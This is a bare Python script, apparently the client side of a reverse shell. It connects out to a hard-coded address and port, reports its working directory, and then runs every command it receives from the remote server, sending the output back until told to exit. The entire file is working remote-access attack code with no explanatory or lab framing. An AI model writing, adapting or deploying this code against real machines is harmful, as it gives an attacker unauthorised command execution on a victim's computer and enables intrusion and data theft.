import socket
import os
import subprocess
import sys

server_ip = "192.168.0.105"
server_port = 12345
buffer = 1024 * 128

s = socket.socket()
s.connect((server_ip,server_port))
cwd = os.getcwd()
s.send(cwd.encode())
while True:
    command = s.recv(buffer).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = "{} {}".format(output,cwd)
    s.send(message.encode())
s.close()